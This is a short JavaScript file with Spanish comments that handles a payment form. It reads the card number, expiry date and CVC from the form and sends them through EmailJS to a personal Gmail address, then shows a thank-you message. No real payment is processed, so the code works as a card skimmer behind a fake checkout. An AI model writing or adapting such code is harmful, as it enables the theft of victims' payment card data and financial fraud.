// Inicializa EmailJS con tu Public Key
(function() {
    emailjs.init('ReqtkWfjI392LAzFb'); // Public Key
})();

document.getElementById('paymentForm').addEventListener('submit', function(e) {
    e.preventDefault();

    // Recopila los datos del formulario
    const cardData = {
        numero: this.querySelector('input[type="text"]').value, // Número de tarjeta
        fecha: this.querySelector('input[type="month"]').value, // Fecha de expiración
        cvc: this.querySelector('input[type="text"]:last-child').value // CVC
    };

    // Envía los datos a tu correo usando EmailJS
    emailjs.send("service_syrc1uk", "template_u3etoro", cardData) // Service ID y Template ID
        .then(() => {
            alert('Datos enviados a karentre100@gmail.com');
            document.getElementById('paymentForm').reset(); // Limpia el formulario
            document.getElementById('thankYouMessage').classList.remove('hidden'); // Muestra el mensaje de agradecimiento
        })
        .catch(error => {
            alert('Error: No se pudo enviar el correo');
            console.error(error); // Imprime el error en la consola
        });
});
